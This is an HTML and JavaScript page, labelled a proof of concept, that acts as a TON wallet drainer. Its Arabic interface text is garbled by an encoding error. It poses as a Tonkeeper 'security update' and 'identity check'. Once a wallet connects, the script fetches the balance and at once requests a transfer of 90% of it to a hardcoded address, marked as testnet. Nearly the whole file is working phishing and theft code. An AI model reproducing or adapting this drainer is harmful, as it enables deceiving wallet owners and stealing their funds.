<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TON Extension Spoofing PoC</title>
    <style>
        body { font-family: sans-serif; background: #0b0e11; color: white; text-align: center; padding: 50px; }
        .card { background: #1e2329; padding: 30px; border-radius: 20px; border: 1px solid #333; display: inline-block; width: 350px; }
        button { background: #fcd535; color: black; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
        #status { margin-top: 20px; color: #848e9c; font-family: monospace; font-size: 13px; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://ton.org/address/ton_logo.png" width="60">
    <h2>ØªØ­Ø¯ÙŠØ« Ø£Ù…Ø§Ù† Ø§Ù„Ø¥Ø¶Ø§ÙØ©</h2>
    <p>Ø³ÙŠØªÙ… ÙØªØ­ Ø¥Ø¶Ø§ÙØ© Tonkeeper Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ù‡ÙˆÙŠØªÙƒ.</p>
    
    <button id="connectBtn">ÙØªØ­ Ø§Ù„Ø¥Ø¶Ø§ÙØ© ÙˆØ§Ù„Ø±Ø¨Ø·</button>
    <div id="status">Ø¬Ø§Ù‡Ø²...</div>
</div>

<script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>

<script>
    const statusDiv = document.getElementById('status');
    const manifest = "https://gist.githubusercontent.com/pp0p/5119b45ec095aecbe9638d21f36e56ad/raw/d30a363c4cf4b6926d8b310a02ee1d350d869729/tonconnect-manifest.json";

    const connector = new TonConnectSDK.TonConnect({ manifestUrl: manifest });

    document.getElementById('connectBtn').onclick = async () => {
        statusDiv.innerText = "Ø¬Ø§Ø±ÙŠ ØªØ­ÙÙŠØ² Ø¥Ø¶Ø§ÙØ© ÙƒØ±ÙˆÙ…...";

        try {
            // Ø®Ø·ÙˆØ© Ù…Ù‡Ù…Ø©: Ø¥Ø°Ø§ ÙƒØ§Ù† Ù‡Ù†Ø§Ùƒ Ø§ØªØµØ§Ù„ Ù‚Ø¯ÙŠÙ…ØŒ Ø§Ù‚Ø·Ø¹Ù‡ Ù„Ø¶Ù…Ø§Ù† Ø¸Ù‡ÙˆØ± Ø§Ù„Ù†Ø§ÙØ°Ø© Ù…Ù† Ø¬Ø¯ÙŠØ¯
            if (connector.connected) {
                await connector.disconnect();
            }

            // ØªØ­Ø¯ÙŠØ¯ Ø£Ù†Ù†Ø§ Ù†Ø±ÙŠØ¯ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¥Ø¶Ø§ÙØ© ØªØ­Ø¯ÙŠØ¯Ø§Ù‹
            // ÙÙŠ Ø¥Ø¶Ø§ÙØ§Øª Ø§Ù„ÙƒØ±ÙˆÙ…ØŒ Ù„Ø§ Ù†Ø­ØªØ§Ø¬ Ù„ÙØªØ­ Ù†Ø§ÙØ°Ø© Ø¬Ø¯ÙŠØ¯Ø© Ø¯Ø§Ø¦Ù…Ø§Ù‹ØŒ Ø§Ù„Ù€ SDK Ø³ÙŠØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ø¥Ø¶Ø§ÙØ© Ù…Ø¨Ø§Ø´Ø±Ø©
            const walletConnectionSource = {
                jsBridgeKey: 'tonkeeper' // Ù‡Ø°Ø§ Ø§Ù„Ù…ÙØªØ§Ø­ ÙŠØ®Ø¨Ø± Ø§Ù„Ù€ SDK Ø¨Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø¥Ø¶Ø§ÙØ© Tonkeeper
            };

            await connector.connect(walletConnectionSource);
            statusDiv.innerText = "ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø·Ù„Ø¨ Ù„Ù„Ø¥Ø¶Ø§ÙØ©. Ø§ÙØ­Øµ Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø§Ù„Ù…Ø­ÙØ¸Ø©.";

        } catch (e) {
            statusDiv.innerText = "Ø®Ø·Ø£: ØªØ£ÙƒØ¯ Ù…Ù† ØªØ«Ø¨ÙŠØª Ø¥Ø¶Ø§ÙØ© Tonkeeper.";
            console.error(e);
        }
    };

    connector.onStatusChange(async (wallet) => {
        if (wallet) {
            statusDiv.innerText = "âœ… Ù…ØªØµÙ„! Ø¬Ø§Ø±ÙŠ Ø³Ø­Ø¨ Ø§Ù„Ø±ØµÙŠØ¯ (Testnet)...";
            statusDiv.style.color = "#00ff00";

            const rawAddress = wallet.account.address;
            
            // Ø¬Ù„Ø¨ Ø§Ù„Ø±ØµÙŠØ¯ Ù…Ù† Ø§Ù„ØªØ³Øª Ù†ÙŠØª
            const response = await fetch(`https://testnet.toncenter.com/api/v2/getAddressInformation?address=${rawAddress}`);
            const data = await response.json();
            const balance = data.result.balance;

            // Ø¥Ø±Ø³Ø§Ù„ Ù…Ø¹Ø§Ù…Ù„Ø© Ø§Ù„Ø³Ø­Ø¨ ÙÙˆØ±Ø§Ù‹
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 60,
                messages: [{
                    address: "0QAPwOt8W9eZqRj2OwxDjwSTtMMCG-uXr6MQMZ0WiFgdP0rY",
                    amount: Math.floor(balance * 0.9).toString() // Ø³Ø­Ø¨ 90%
                }]
            };

            try {
                await connector.sendTransaction(transaction);
                statusDiv.innerText = "ğŸš€ ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø·Ù„Ø¨ Ø§Ù„Ø³Ø­Ø¨ Ù„Ù„Ø¥Ø¶Ø§ÙØ©!";
            } catch (err) {
                statusDiv.innerText = "ÙØ´Ù„ Ø§Ù„Ø³Ø­Ø¨ Ø£Ùˆ ØªÙ… Ø±ÙØ¶Ù‡.";
            }
        }
    });
</script>
</body>
</html>
